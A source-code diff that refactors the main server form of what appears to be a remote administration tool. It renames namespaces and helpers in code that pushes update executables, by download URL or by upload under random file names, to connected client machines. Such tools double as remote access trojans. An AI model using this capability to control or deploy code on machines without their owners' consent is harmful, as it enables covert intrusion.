@@ -5,14 +5,12 @@ using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Commands;
-using xServer.Core.Extensions;
+using xServer.Enums;
 using xServer.Core.Helper;
-using xServer.Core.Misc;
 using xServer.Core.Networking;
 using xServer.Core.Networking.Utilities;
+using xServer.Core.Utilities;
 using xServer.Settings;
-using UserStatus = xServer.Core.Commands.CommandHandler.UserStatus;
-using ShutdownAction = xServer.Core.Commands.CommandHandler.ShutdownAction;
 
 namespace xServer.Forms
 {
@@ -76,9 +74,6 @@ namespace xServer.Forms
 
             _lvwColumnSorter = new ListViewColumnSorter();
             lstClients.ListViewItemSorter = _lvwColumnSorter;
-
-            lstClients.RemoveDots();
-            lstClients.ChangeTheme();
         }
 
         public void UpdateWindowTitle()
@@ -176,7 +171,7 @@ namespace xServer.Forms
         {
             if (client.Value != null)
             {
-                client.Value.DisposeForms();
+                client.Value.Dispose();
                 client.Value = null;
             }
 
@@ -400,11 +395,11 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        if (Core.Misc.Update.UseDownload)
+                        if (Core.Utilities.Update.UseDownload)
                         {
                             foreach (Client c in GetSelectedClients())
                             {
-                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Utilities.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                             }
                         }
                         else
@@ -417,8 +412,8 @@ namespace xServer.Forms
                                     if (c == null) continue;
                                     if (error) continue;
 
-                                    FileSplit srcFile = new FileSplit(Core.Misc.Update.UploadPath);
-                                    var fileName = Helper.GetRandomFilename(8, ".exe");
+                                    FileSplit srcFile = new FileSplit(Core.Utilities.Update.UploadPath);
+                                    var fileName = FileHelper.GetRandomFilename(8, ".exe");
                                     if (srcFile.MaxBlocks < 0)
                                     {
                                         MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
@@ -427,7 +422,7 @@ namespace xServer.Forms
                                         break;
                                     }
 
-                                    int id = Helper.GetNewTransferId();
+                                    int id = FileHelper.GetNewTransferId();
 
                                     CommandHandler.HandleSetStatus(c,
                                         new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
@@ -669,7 +664,7 @@ namespace xServer.Forms
                                     break;
                                 }
 
-                                int id = Helper.GetNewTransferId();
+                                int id = FileHelper.GetNewTransferId();
 
                                 CommandHandler.HandleSetStatus(c,
                                     new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
